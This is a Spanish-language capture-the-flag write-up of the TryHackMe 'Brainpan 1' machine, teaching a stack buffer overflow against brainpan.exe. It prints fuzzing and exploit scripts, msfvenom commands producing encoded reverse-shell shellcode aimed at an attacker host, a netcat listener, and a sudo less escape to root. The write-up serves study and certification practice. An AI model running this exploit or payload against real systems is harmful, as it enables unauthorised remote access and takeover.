---
title: "Brainpan 1 - THM Writeup"
date: 2022-01-12T10:22:30-04:00
categories:
  - cajas
tags:
  - thm
  - bof
  - windows
  - escape
  - reversing
---
![image](https://tryhackme-images.s3.amazonaws.com/room-icons/f184bf1424977ce8b3198d1a8c212700.png){: width="100"}

El dia de hoy se presenta una guia o `writeup` sobre una maquina interesante en la plataforma de [TryHackMe](https://tryhackme.com/room/brainpan) la cual segun su propia descripcion indica que se hara un analisis de una vulnerabilidad por desbordamiento de buffer (`buffer overflow`) de un archivo ejecutable de `Windows .exe`, lo cual nos prepara de cierta forma para un reto en la certificacion [OSCP](https://www.offensive-security.com/pwk-oscp/) que es una de las mas demandadas a nivel profesional en el campo de la *Ciberseguridad* que tanto seguimos, por lo tanto todo esto comprende un reto tambien importante para nosotros al introducirnos en el area profesional del `Hacking Etico`.

Un desbordamiento de bufer se refiere a una anomalia en donde un programa, mientras escribe en los buferes de memoria asignados para ciertas variables o registros, sobrepasa los limites de algun bufer, llegando a escribir en locaciones de memoria adyacentes como se presenta a continuacion:
![image](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Buffer_overflow_basicexample.svg/1280px-Buffer_overflow_basicexample.svg.png){: width="500"}

Brainpan is perfect for OSCP practice and has been highly recommended to complete before the exam. Exploit a buffer overflow vulnerability by analyzing a Windows executable on a Linux machine. If you get stuck on this machine, don't give up (or look at writeups), just try harder. 
{: .alert .alert-info}

Esta caja en particular no utiliza `flag` de hashes en archivos `.txt` pero de igual forma completaremos los objetivos segun se vayan logrando los cuales son:

1. Deploy the machine.
2. Gain initial access
3. Escalate your privileges to root.

**Sin saltarse ninguno antes de realmente completarlo**, vamos paso a paso.

Una vez logeados, procedemos a iniciar la maquina ~~y agregarle 1 hora mas por si acaso~~, luego nos conectamos al VPN con
> `sudo openvpn /PATHTO/USER.ovpn`{:.language-bash .highlight}

Aqui ya podemos marcar el primer objetivo como completado, y empezamos...

## RECONOCIMIENTO

Como siempre primero podemos hacer un `ping -c 1 IP`{:.language-bash .highlight} para determinar el `TTL` de la respuesta a ver si se acerca a 64 (Linux) o a 128 (Windows), vemos en este caso que es Linux.

Luego seguimos con nuestro escaneo con la herramienta `nmap`{:.language-bash .highlight} para identificar puertos abiertos y mucho mas con:
> `nmap -p- --open -T5 -n -v 10.10.136.187 -oN puertos.txt`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149168356-1fdfc1b9-5f1a-4139-93b3-ee11283955f7.png)

Para ver **todos** los puertos TCP `-p-`, solo listar puertos `--open`, con velocidad maxima de escaneo `-T5`, sin resolucion DNS `-n`, `-v`erbosidad para ver puertos abiertos en salida y guardando un archivo `-oN puertos.txt`

Procedemos a analizar en mas detalle los puertos abiertos pasandoles scripts basicos de enumeracion `-sC` y deteccion de version `-sV`, con salida al archivo `version.txt`.
> `nmap -sC -sV 10.10.137.187 -oN version.txt`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149168625-79fe0007-3015-4b83-a756-1037538c7a3f.png)


Vemos que existen dos puertos `9999,10000` que buscando en internet lo que es `abyss` es un protocolo de interfaz de web, asi que los dos deberian ser paginas HTTP, sin embargo al abrir en el navegador nos topamos que solo el puerto `http://10.10.136.187:10000/` es el unico que responde a `whatweb` y a nuestro explorador de internet con sitio estatico sin mucha informacion acerca de la maquina.

De resto con el puerto `9999` habiamos visto un banner que se envio a traves de la enumeracion de `nmap`, asi que podemos entablar una conexion `telnet` por el puerto especificado a ver que envia el servidor:
![image](https://user-images.githubusercontent.com/85322110/149183450-35108248-1504-4913-9998-f182054c2069.png)

La conexion al abrirse nos muestra el banner de brainpan, y se queda esperando por una clave que no conocemos, y si es erronea la conexion se cierra. Por los momentos dejaremos este puerto tranquilo y veremos el otro.

Podemos hacer `fuzzing` que es la tecnica que se usa para buscar alguna ruta existente en subdirectorios de la pagina, para ello podemos usar la herramienta `gobuster` desarrollada en lenguaje Go:

> `gobuster dir -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.137.187:10000/ --no-error`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149178025-223b96ac-0283-44e3-8d68-254ee7d4df93.png)

Haciendo uso de su funcion `dir` con 200 threads `-t`, usando el diccionario `-w directory-list-2.3-medium.txt` que es muy usado, pasandole la URL `-u` con el puerto 10000, y poniendo `--no-error` para evitar mostrar errores de timeout, vemos que aun sin terminar ya encontro un subdirectorio `bin` que si lo abrimos en el explorador:
![image](https://user-images.githubusercontent.com/85322110/149178982-47301116-32fb-475e-8cea-a4b01437951b.png)

Vemos un `directory listing` donde podemos ver un archivo `brainpan.exe`, este vamos a descargarlo a nuestra maquina Linux para hacerle analisis y seguimos con la siguiente etapa... 

## ESCANEO

Nos bajamos el archivo `brainpan.exe` con `wget` y poniendo la ruta, y usamos `file` para ver que tipo de binario es:
![image](https://user-images.githubusercontent.com/85322110/149179578-047f82f1-f162-4337-a0ed-4eb3839d6f76.png)

Vemos que es un archivo hecho para Windows en version de 32 bits. En este punto para poder ver que es lo que hace este ejecutable, y para debuggearlo de una mejor forma, nos descargaremos e instalaremos una maquina virtual con `Windows 7 32-bits`. Yo usare la imagen de [Windows 7 SP1 MiniOS7 PRO x86](https://www.dprojects.org/minios) de [Daniel (Doofy) Rodriguez](https://www.youtube.com/channel/UCU876E5XzldL34k0ZtY3o9g), que tiene un tamaño de archivo menor, es una version mas ligera, tiene una instalacion mas rapida y nos funciona de maravilla para la tarea que vamos a realizar.

Una vez tengamos nuestra maquina montada, descargamos e instalamos el [Immunity Debugger](https://www.immunityinc.com/products/debugger/) que es la herramienta de analisis de binarios e ingenieria inversa que se recomienda en el OSCP y es la mas comunmente usada para este tipo de investigacion:
![image](https://user-images.githubusercontent.com/85322110/149190124-4a6caaee-9740-4258-941e-88284277e30e.png)

En esta maquina requeriremos de desactivar la `Data Execution Protection` que es el mecanismo que se utiliza a nivel de hardware para marcar la memoria con atributos que indican que la ejecucion de comandos no sea posible en espacios de memoria asignados, con esto desactivado podremos hacer el debug y probar el exploit sin ningun problema. Para desactivar esto necesitamos abrir una consola `cmd.exe` con permisos de Administrador y enviar el siguiente comando:
> `BCDEDIT /SET {CURRENT} NX ALWAYSOFF`{:.language-cmd .highlight}

Una vez enviado el comando, reiniciamos la maquina Windows y ya la `DEP` estara desactivada, ahora tenemos que ver la forma de como enviar el archivo `brainpan.exe` a esta maquina, podemos hacerlo usando `impacket-smbserver`, `python -m http.server`{:.language-bash .highlight} o cualquier otro medio, recordando siempre que aca se deben usar las IPs de la red NAT que otorga nuestro software de virtualizacion (aca estamos usando [VMWare Workstation Player](https://www.vmware.com/latam/products/workstation-player/workstation-player-evaluation.html)):
![image](https://user-images.githubusercontent.com/85322110/149192926-dee3952b-1a37-4421-8d26-402adc12e82e.png)

Usamos `impacket-smbserver` ya que el servidor web con `python -m http.server`{:.language-bash .highlight} dio alertas con `Internet Explorer` y por no instalar otro explorador, nos quedamos con SMB.

Luego abrimos una consola, vamos a la ruta del archivo y lo corremos desde `cmd.exe`, nos damos cuenta que abre un puerto `9999` esperando por conexion:
![image](https://user-images.githubusercontent.com/85322110/149193320-2ca5c8ff-86c2-498b-b7cf-e4b63eeb2109.png)

Y si probamos hacer `telnet` desde nuestra maquina Linux a este nuevo servidor recibimos el mismo banner anterior y la respuesta es recibida desde la consola Windows:
![image](https://user-images.githubusercontent.com/85322110/149193796-cc7dced2-ff21-4621-a22c-4ff09f627f1d.png)

Con esto concluimos que es el mismo servicio abierto en la maquina `Brainpan 1` y seguiremos con su analisis a ver de que manera puede ser explotado.

Para ello podemos crear un script para hacer fuzzing de desbordamiento a ver si este binario es susceptible a `buffer overflow`, esto se hara con el siguiente script en `Python`:

```python
#!/usr/bin/python
import socket, sys, time #socket para conexiones, sys para pasar argumentos, time para usar sleep
if __name__ == '__main__':
    ip_addr =  sys.argv[1] #Tomamos los valores de IP y Puerto
    port = int(sys.argv[2])
    string = 'A' #Caracter a enviar
    mult = 100 #Multiplicador
    for i in range(32):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creando socket, AF_INET representa conexiones IPV4, SOCK_STREAM representa conexion TCP
            s.settimeout(5) #Si cualquier conexion del socket tarda mas de 5 segundos, salta a error except:
            s.connect((ip_addr, port)) #Conectando al socket
            data = s.recv(1024) #Recibiendo data inicial (banner)
            print("[*] Enviando", mult, "caracteres...\r", end='') #Con retorno y sin salto de linea para sobreescribir en el mismo texto
            s.send((string*mult).encode('latin1')) #Enviando caracteres, usando encoder 'latin1' que no modifica los hex codes, python3 lo exije
            data = s.recv(1024)
            mult += 100 #Aumento de 100
            time.sleep(1)
        except:
            print("    [!] Ocurrio un error! Bufer actual en", mult, "caracteres...")
            sys.exit(1)
```

En los comentarios se puede leer la descripcion en cada linea, pero basicamente envia letras 'A' de 100 en 100 al socket conectado en el puerto 9999 de la maquina victima. Luego abrimos el proceso `brainpan.exe` nuevamente desde nuestra maquina Windows 7, y ejecutamos el exploit con `python bofexploit.py` o `./bofexploit.py` si tiene permisos de ejecucion. Con esto vamos a ver como se van a ir enviando los caracteres pero... **sorpresa!**, vemos como el programa se corrompe al enviar **600** caracteres, esto significa que el programa es susceptible a este tipo de vulnerabilidad.
![image](https://user-images.githubusercontent.com/85322110/149200494-83ae3639-d6d2-489f-a79f-64d28d72e73a.png)

Ya con ello, vamos a nuevamente abrir el proceso `brainpan.exe` y abrimos nuestro `Immunity Debugger` que instalamos previamente, luego le damos a File -> Attach para conectarnos con el proceso `brainpan.exe` (podemos hacer uso del sortear por Name) que ya esta abierto en nuestra consola `cmd.exe`
![image](https://user-images.githubusercontent.com/85322110/149200728-5c08beb5-63a0-4bab-88c0-d1642afeec2c.png)
![image](https://user-images.githubusercontent.com/85322110/149200902-48d1f3c3-a8ef-408b-adab-d4c9e387facc.png)

Sin embargo al conectarnos al proceso, este se pondra en estado Paused como se puede observar en la siguiente imagen, con eso debemos darle al boton de Play en la barra de arriba para que el proceso siga corriendo:
![image](https://user-images.githubusercontent.com/85322110/149201326-15a262db-289d-4988-b6f9-0784e934db69.png)

Luego de eso vamos a nuevamente correr nuestro script desde la maquina Linux y veremos el comportamiento del programa al momento de desbordarse el bufer y tener un error:
![image](https://user-images.githubusercontent.com/85322110/149205445-f6fd6131-c0fa-4d8c-ad9e-d0fbd697330c.png)

La letra `A` representada en hexadecimal (ascii) tiene la forma `0x41`, y vemos como dicho valor `41` se repite muchas veces en diferentes registros, esto pasa por lo siguiente: El Stack o Pila en memoria son una serie de espacios en donde se almacena la informacion, como vemos en la imagen, existe un area llamada `Buffer Space` que es donde el programa guarda ciertos parametros como variables locales, entre otros, siendo en nuestro caso el espacio donde el programa guarda la entrada del usuario por telnet. La forma de escritura de memoria en el caso de la imagen es hacia abajo, vemos como los registros `EBP` y `EIP` estan por debajo de la que seria nuestra posicion actual, y el desbordamiento de bufer ocurre cuando sobrepasamos el limite del bufer que seria asignado a nuestra variable, y vamos mas alla llenando los espacios subyacentes.
^
![image](https://user-images.githubusercontent.com/85322110/149208231-96f3e8af-c3fa-45b0-9a4f-63932b5110c1.png){: width="300"}

El registro `EIP` es de extrema importancia, ya que es en donde se define a que instruccion debe saltar el programa en cada paso, si podemos escribir en el, teoricamente podemos dirigir el flujo del programa a nuestra conveniencia. Con esto en mente, debemos buscar una forma de saber cuantos caracteres exactamente necesitamos para llegar a ese registro `EIP`, ya que en dentro de el no queremos caracteres aleatorios o `A`es, necesitamos colocar en el una direccion en el programa que nos sirva para ejecutar comandos remotamente.

El concepto aca seria generar una serie de caracteres que no se repitan, enviar el desbordamiento de bufer, y ver que numero se coloca en el `EIP` para saber en que posicion de la cadena que enviamos es donde se ubicara ese registro.

Esto se puede hacer de multiples maneras, por aca lo haremos con `gdb-peda`, en nuestra maquina Linux utilizamos el comando `gdb -q`{:.language-bash .highlight} para abrir el GNU Debugger con peda, y luego usamos **(no cerrar la ventana de gdb-peda ya que la usaremos mas adelante)**
> `pattern create 600`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149210093-1db7d3a8-26af-4644-beb2-42ed17ef6027.png)

Esto nos creara un patron de 600 caracteres (mayor que nuestro `buffer overflow`) que son unicos en series no repetitivas de 32 bits (4 Bytes = 4 chars), luego nos copiamos esto y debemos enviar nuevamente al servicio `brainpan.exe`, esto lo podriamos reemplazar en el bufer que se envia por nuestro Script de Python, pero para hacerlo mas sencillo podemos simplemente abrir una nueva sesion de `telnet` y enviarlo desde alli ya que los caracteres son reconocibles por consola.

Para esto hay que primero cerrar el `Immunity Debugger` si estaba abierto ya con el proceso `brainpan` asignado, luego volver a abrir el `brainpan.exe` desde consola, y luego volver a abrir `Immunity Debugger` y volver a Attach el proceso.

Una vez el proceso este activo, enviamos por `telnet` el patron creado en gdb-peda y vemos nuevamente el EIP que queda alojado en memoria. Vemos que pone un codigo `73413973`, este codigo nos lo copiamos y lo ponemos en `gdb-peda` con el comando `patron offset 0x73413973`{:.language-bash .highlight} y nos indica que existe un `offset` desde el inicio hasta este codigo, de `524` caracteres. Despues de esto la ventana de `gdb-peda` puede ser cerrada.
![image](https://user-images.githubusercontent.com/85322110/149213047-9a0a35a7-449b-4ea2-9248-2b4cef8af584.png)
![image](https://user-images.githubusercontent.com/85322110/149213005-2b68526d-6940-4011-affa-fb7c776f0caf.png)

Ya con esto tenemos el offset que necesitamos enviar antes de llegar al registro `EIP`, la idea ahora es enviar los `524` caracteres primarios del offset, luego enviar el `EIP` que son `4` caracteres mas, y luego de esto enviaremos nuestro `payload` (que al ver la respuesta del servidor, vemos que el restante de la cadena luego de los primeros `528` caracteres, se guardan en el registro `ESP`) con el objetivo final de obtener una `reverse shell` (consola remota) a nuestro equipo, sin embargo no es tan sencillo como colocar el EIP apuntando a la direccion de memoria donde estara el payload, pues _existen 2 inconvenientes_:

1. En ciertos binarios existen caracteres que no son correctamente interpretados por el computador, estos son llamados `bar chars` o caracteres malos, es necesario encontrar y evitar el uso de estos `bad chars` en la creacion del payload de explotacion.
2. No se puede apuntar directamente con el `EIP` hacia el registro donde se esta guardando el resto de nuestro payload que seria el registro `ESP`, apuntar a su direccion directamente nos llevaria a un error de ejecucion.

Para resolver el primer problema, retocaremos nuestro script en Python para mandar: `524 chars (offset) + 4 chars (EIP) + bytearray` donde `bytearray` seran **todos los numeros hexadecimales de 16 bits**, es decir, desde el `0x00` hasta el `0xFF` o `\xFF`. Para crear esta cadena de bytes automaticamente podemos hacer uso de [mona.py](https://github.com/corelan/mona) que es un tipo de "plug-in" para `Immunity Debugger`, seguimos los pasos para su instalacion y procedemos a usarlo de la siguiente manera:

Maximizamos `Immunity Debugger` y en la linea de entrada de comandos de abajo introducir el siguiente comando para crear la carpeta de trabajo que `mona.py` usara (en mi caso decidi C:\brainpan):
![image](https://user-images.githubusercontent.com/85322110/149221708-78711d60-a53c-4da6-a7a2-5aff36fd3b74.png)
> `!mona config -set workingfolder C:\%p`{:.language-bash .highlight}
Luego ya que tenemos la carpeta definida, utilizamos la funcion `!mona bytearray` para crear la cadena de bytes de la siguiente forma:
> `!mona bytearray -cpb \x00`{:.language-bash .highlight}
Donde `-cpb \x00` es para no colocar el bad char 0x00 que ya se sabe debe ignorarse. Esto creara en la carpeta configurada anteriormente dos archivos `bytearray.bin` y `bytearray.txt` que el archivo de texto lo pasaremos a nuestra maquina para copiar el array, y el `.bin` lo usaremos mas adalante para comparar si hay algun `bad char` o no.

Una vez copiado el archivo `bytearray.txt` a nuestra maquina Linux (se hace con `impacket-smbserver` de nuevo) podemos hacer uso de `grep` y `xclip` para copiar el contenido:
> `grep ^\" bytearray.txt | xclip -sel clip`{:.language-bash .highlight}
![image](https://user-images.githubusercontent.com/85322110/149220672-474bc336-62fb-4039-baa0-3c87253e34d7.png)

Y luego retocamos nuetro script para incluir estos bytes luego de la posicion del `EIP`:

```python
#!/usr/bin/python
import socket, sys, time
if __name__ == '__main__':
    ip_addr =  sys.argv[1]
    port = int(sys.argv[2])
    offset = 'A'*524
    eip = 'B'*4
    command = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    payload = offset + eip + command 
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip_addr, port))
        data = s.recv(1024)
        print("[*] Enviando payload...")
        s.send((payload).encode('latin1'))
        data = s.recv(1024)
    except:
        print("\n    [!] Ocurrio un error!")
        sys.exit(1)

```

Al enviar el script:
![image](https://user-images.githubusercontent.com/85322110/149221375-f9b3c99e-026a-4ca8-9336-e0bfb32bb555.png)
Vemos como efectivamente el `EIP` se muestra como `42424242` que significa `BBBB`, y justo despues de este viene el stack `ESP` en donde vemos todo nuestro `bytearray` desde `0x01` hasta `0xFF`, es ciertamente ineficiente revisar caracter por caracter, asi que haremos uso de `mona.py` nuevamente donde tiene una funcion que hace esto por nosotros. Solo es ejecutar la siguiente linea:
> `!mona compare -f C:\brainpan\bytearray.bin -a 0x0022F930`{:.language-bash .highlight} 

Comparamos el bytearray que creamos anteriormente con todo lo que viene a continuacion del `ESP` (0x0022F930) y esto nos devuelve una ventana donde no se presenta ningun `bad char`
![image](https://user-images.githubusercontent.com/85322110/149222484-079c9000-6236-45d3-83f2-d53e98fc9841.png)
Es decir que solo tenemos el `\x00` como `bad char`, en caso de que existiese otro solo mostraria uno solo, por lo tanto habria que recrear el `bytearray` excluyendo ese otro badchar con la forma `-cpb \x00\x??` y repetir todo el proceso, asi consecutivamente hasta que no nos muestre ningun `bad char` al hacer un `!mona compare`

Ya con esto resolvemos el primer problema, ahora para el segundo tenemos lo siguiente:

Como no se puede apuntar directamente el `EIP` el stack `ESP` que es donde se deposita nuestro payload, debemos buscar una funcion en el mismo `brainpan.exe` que haga un salto al ESP `jmp esp`, de esta forma hariamos un salto indirecto hacia nuestro `payload`. Para encontrar un `jmp esp` dentro del programa, primero debemos buscar cual es el `Operation Code (opcode)` de `jmp esp` y lo logramos haciendo `Ctrl + F` dentro de Immunity Debugger.
![image](https://user-images.githubusercontent.com/85322110/149224942-ec8c8a51-e709-4b4b-b659-3b81ef2309bf.png)
Con eso vemos el codigo es `FFE4`, no debemos prestarle atencion a la direccion a la izquierda ya que esta varia y no funcionara si la ponemos en el `EIP`, en cambio podemos usar `mona.py` para ubicar donde se encontraria un `jmp esp` usable para esto, y lo hacemos con:
> `!mona modules`{:.language-bash .highlight} para saber que modulo debemos usar (brainpan.exe)
> ![image](https://user-images.githubusercontent.com/85322110/149225255-90a8c500-2f5a-46c6-8db1-714b2d265f0b.png)

> `!mona -m brainpan.exe -s \xFF\xE4`{:.language-bash .highlight} para ubicar el pointer deseado
> ![image](https://user-images.githubusercontent.com/85322110/149225632-154d8992-8168-4700-ac51-3a762cbc720b.png)

Vemos como el pointer `jmp esp` se ubica en la direccion `0x311712F3`, este seria finalmente nuestro `EIP` deseado, que hara una redireccion al `ESP` donde meteremos nuestro `payload` al culminar. Al momento de configurar esta direccion en el script de Python, es necesario saber que el `EIP` especificamente debe venir en formato [Little Endian](https://es.wikipedia.org/wiki/Endianness), para esto solo hay que invertir la posicion de los bytes, es decir que nuestra variable quedaria como `eip = "\xf3\x12\x17\x31"`.

Ahora solo resta crear un `payload` en formato shell que permita ejecutar acciones a bajo nivel que nos permita obtener una consola remota desde la maquina victima hacia nuestra maquina de atacante. Esto lo podremos lograr con la herramienta `msfvenom` del metasploit framework, que nos permite crear un payload rapidamente sin tener que estar inmersos en el entorno de metasploit.

Para nuestra maquina de pruebas utilizarmos el payload `windows/shell_reverse_tcp` que ejecuta una consola con conexion inversa a nosotros, para ello ejecutamos el comando
```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 -f python -v command LHOST=192.168.132.128 LPORT=443 EXITFUNC=thread -b '\x00' -e x86/shikata_ga_nai` 
```
En donde usamos el `-p`ayload requerido, marcamos la `--platform` y su `-a`rquitectura, usamos el `-f`ormato python con la `-v`ariable commmand, usamos `LHOST / LPORT` de *nuestra maquina de atacante*, marcamos los `bad chars -b`, y finalmente usamos el `-e`ncoder [shikata_ga_nai](https://security.stackexchange.com/questions/130256/what-is-shikata-ga-nai) para ofuscar nuestro comando y evitar detecciones de antimalwares.
![image](https://user-images.githubusercontent.com/85322110/149255828-21df4f67-1e41-4632-b2a9-167730d31d9e.png)

Copiamos estas lineas quitando la letra `b` en `b"\xxx\xxx..."` para quedarnos con variables en `str` y no en bytes ya que se codifican luego con `latin1`. Reemplazamos nuestra variable command y tambien agregamos `nops = "\x90"*20`, los `NOPs` son operaciones nulas en la ejecucion de comando, es decir, no hacer nada, estas no-instrucciones las ponemos antes de los comandos del payload, esto porque estos comandos van codificados con `shikata_ga_nai` y pueden tomar un tiempo en decodificarse, por lo que si no se espera y se pasa directo a la ejecucion de este, puede haber mala interpretacion del codigo.

Nuestro script `bofexploit.py` queda finalmente estructurado de la siguiente manera

```python
#!/usr/bin/python
import socket, sys, time
if __name__ == '__main__':
    ip_addr =  sys.argv[1]
    port = int(sys.argv[2])
    offset = 'A'*524
    eip = "\xf3\x12\x17\x31"
    nops = "\x90"*20
    command =  ""
    command += "\xb8\xad\x3d\x78\xbb\xda\xc9\xd9\x74\x24\xf4\x5f"
    command += "\x31\xc9\xb1\x52\x31\x47\x12\x03\x47\x12\x83\x6a"
    command += "\x39\x9a\x4e\x88\xaa\xd8\xb1\x70\x2b\xbd\x38\x95"
    command += "\x1a\xfd\x5f\xde\x0d\xcd\x14\xb2\xa1\xa6\x79\x26"
    command += "\x31\xca\x55\x49\xf2\x61\x80\x64\x03\xd9\xf0\xe7"
    command += "\x87\x20\x25\xc7\xb6\xea\x38\x06\xfe\x17\xb0\x5a"
    command += "\x57\x53\x67\x4a\xdc\x29\xb4\xe1\xae\xbc\xbc\x16"
    command += "\x66\xbe\xed\x89\xfc\x99\x2d\x28\xd0\x91\x67\x32"
    command += "\x35\x9f\x3e\xc9\x8d\x6b\xc1\x1b\xdc\x94\x6e\x62"
    command += "\xd0\x66\x6e\xa3\xd7\x98\x05\xdd\x2b\x24\x1e\x1a"
    command += "\x51\xf2\xab\xb8\xf1\x71\x0b\x64\x03\x55\xca\xef"
    command += "\x0f\x12\x98\xb7\x13\xa5\x4d\xcc\x28\x2e\x70\x02"
    command += "\xb9\x74\x57\x86\xe1\x2f\xf6\x9f\x4f\x81\x07\xff"
    command += "\x2f\x7e\xa2\x74\xdd\x6b\xdf\xd7\x8a\x58\xd2\xe7"
    command += "\x4a\xf7\x65\x94\x78\x58\xde\x32\x31\x11\xf8\xc5"
    command += "\x36\x08\xbc\x59\xc9\xb3\xbd\x70\x0e\xe7\xed\xea"
    command += "\xa7\x88\x65\xea\x48\x5d\x29\xba\xe6\x0e\x8a\x6a"
    command += "\x47\xff\x62\x60\x48\x20\x92\x8b\x82\x49\x39\x76"
    command += "\x45\xb6\x16\xfc\x15\x5e\x65\xfc\x14\x24\xe0\x1a"
    command += "\x7c\x4a\xa5\xb5\xe9\xf3\xec\x4d\x8b\xfc\x3a\x28"
    command += "\x8b\x77\xc9\xcd\x42\x70\xa4\xdd\x33\x70\xf3\xbf"
    command += "\x92\x8f\x29\xd7\x79\x1d\xb6\x27\xf7\x3e\x61\x70"
    command += "\x50\xf0\x78\x14\x4c\xab\xd2\x0a\x8d\x2d\x1c\x8e"
    command += "\x4a\x8e\xa3\x0f\x1e\xaa\x87\x1f\xe6\x33\x8c\x4b"
    command += "\xb6\x65\x5a\x25\x70\xdc\x2c\x9f\x2a\xb3\xe6\x77"
    command += "\xaa\xff\x38\x01\xb3\xd5\xce\xed\x02\x80\x96\x12"
    command += "\xaa\x44\x1f\x6b\xd6\xf4\xe0\xa6\x52\x14\x03\x62"
    command += "\xaf\xbd\x9a\xe7\x12\xa0\x1c\xd2\x51\xdd\x9e\xd6"
    command += "\x29\x1a\xbe\x93\x2c\x66\x78\x48\x5d\xf7\xed\x6e"
    command += "\xf2\xf8\x27"
    payload = offset + eip + nops + command 
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip_addr, port))
        data = s.recv(1024)
        print("[*] Enviando payload...")
        s.send((payload).encode('latin1'))
        data = s.recv(1024)
    except:
        print("\n    [!] Ocurrio un error!")
        sys.exit(1)
```

Si re-abrimos el servicio `brainpan.exe` en nuestra maquina de prueba (sin utilizar el Immunity Debugger para que no pause la ejecucion) y ejecutamos el `./bofexploit.py 192.168.132.131 9999`{:.language-bash .highlight} mientras en otra ventana hacemos un `sudo nc -nlvp 443`{:.language-bash .highlight} para escuchar con `netcat` el puerto en espera de una consola remota, observamos como se realiza la explotacion de la vulnerabilidad de desbordamiento de bufer para ganar acceso inicial a nuestro sistema de prueba:
![image](https://user-images.githubusercontent.com/85322110/149257218-451c7f3f-32b5-439d-b655-1dd93bc27672.png)

Ahora solo falta adaptar este exploit al sistema Linux en el que esta basado la maquina original de TryHackMe, para ello cambiaremos el payload del msfvenom a `linux/x86/shell_reverse_tcp`con la siguiente ejecucion:
```bash
msfvenom -p linux/x86/shell_reverse_tcp -a x86 -f python -v command LHOST=10.8.33.130 LPORT=443 -b '\x00' -e x86/shikata_ga_nai
```
De igual forma copiamos el texto en nuestro script, abrimos una instancia de `nc` y ejecutamos el exploit ahora contra la IP de la maquina de TryHackMe y ganamos acceso con una consola no muy interactiva:
![image](https://user-images.githubusercontent.com/85322110/149258869-18b22782-2cb9-4e44-95ed-b29235cdfdb9.png)

Con esto podremos completar nuestro segundo objetivo de la maquina...

## ESCALADA DE PRIVILEGIOS

Una vez tenemos acceso, lo primero que podemos hacer es obtener una consola mas interactiva haciendo uso de una serie de pasos que se explican a continuacion:

- `script /dev/null -c bash`{:.language-bash .highlight}
- En teclado `Ctrl + Z`
- `stty raw -echo; fg`{:.language-bash .highlight}
- Escribir `reset` aunque no se vea
- `xterm` en Terminal Type
- `export SHELL=bash`{:.language-bash .highlight}
- `export TERM=xterm`{:.language-bash .highlight}

Ya con esto tenemos una consola interactiva con la cual procedemos a seguir investigando en como ganar privilegios de `root`. En un principio entramos como el usuario `puck` pero al escribir `sudo -l` vemos que podemos ejecutar el paquete `/home/anansi/bin/anansi_util` como `root` sin proveer password:
![image](https://user-images.githubusercontent.com/85322110/149259975-82e6b7a6-0c99-46df-b6a8-56196afb9d7b.png)

Asi que ejecutamos el comando haciendo `sudo /home/anansi/bin/anansi_util`{:.language-bash .highlight} vemos una serie de opciones, probamos con:
> `sudo /home/anansi/bin/anansi_util manual cat`{:.language-bash .highlight}

Y vemos que nos abre un manual del tipo `man` o `less`, pero al estar ejecutando esto como `root` podemos facilmente escribir `!/bin/bash` para escapar del `less` y ejecutar comandos desde alli, y finalmente esto nos abrira una consola `bash` con permisos de `root`:
![image](https://user-images.githubusercontent.com/85322110/149260381-63acf414-9994-4a34-8a94-5fcc19f75c0e.png)

Con esto completamos el ultimo objetivo de nuestra maquina explotando exitosamente una vulnerabilidad de `buffer overflow` en ambos entornos Windows y Linux...

Saludos!
